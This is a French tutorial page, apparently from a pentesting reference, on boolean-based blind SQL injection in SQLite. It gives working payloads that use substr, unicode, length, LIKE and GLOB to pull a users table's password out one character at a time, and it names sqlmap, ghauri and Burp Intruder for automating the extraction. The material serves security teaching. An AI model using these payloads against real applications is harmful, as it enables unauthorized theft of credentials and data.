---
order: 1
title: "Injection SQL aveugle booléenne dans SQLite"
description: "Déduire des données SQLite un caractère à la fois à partir de différences de réponse vrai/faux avec substr et unicode sur sqlite_master et les tables."
keywords:
  - boolean based blind
  - injection SQL aveugle
  - substr unicode
  - inférence SQLite
  - sqlite_master
---

# Aveugle

Comme le canal d'erreur de SQLite est faible, l'inférence booléenne est le moyen fiable de lire des données quand les lignes ne sont pas reflétées. Si une condition vraie et une condition fausse s'affichent différemment, chaque comparaison injectée répond à une question oui/non.

SQLite isole un caractère avec `substr()` et le convertit avec `unicode()` (son équivalent de `ASCII`) pour la comparaison :

```sql
' AND unicode(substr((SELECT password FROM users LIMIT 1),1,1))>77-- 
```

Une recherche binaire fixe chaque caractère en environ sept requêtes, puis la position avance. Trouvez d'abord la longueur avec `length()` :

```sql
' AND length((SELECT password FROM users LIMIT 1))=32-- 
```

Confirmez l'oracle avec une paire vrai/faux connue (`' AND 1=1--` contre `' AND 1=2--`). SQLite prend en charge `LIKE` pour un oracle compact qui ne nécessite pas de `substr`, en ancrant un caractère à la fois :

```sql
' AND (SELECT password FROM users LIMIT 1) LIKE 'a%'-- 
```

`LIKE` est insensible à la casse pour l'ASCII par défaut ; utilisez `GLOB` (`GLOB 'a*'`) pour une correspondance sensible à la casse. Le schéma se lit de la même manière depuis `sqlite_master`. L'extraction aveugle est lente et habituellement automatisée, mais la comparaison par requête unique est ce qui vous permet de vous adapter quand un outil bloque, et c'est le canal principal pour SQLite étant donné la surface d'erreur limitée.

## Outils

- **sqlmap** : extraction booléenne automatisée (`--technique=B`).
- **ghauri** : inférence booléenne rapide avec une forte évasion de WAF.
- **Burp Intruder** : scripte à la main les requêtes de comparaison par caractère.

## Références

- SQLite Documentation: substr, unicode, length, LIKE, GLOB
- PortSwigger Web Security Academy: Blind SQL injection
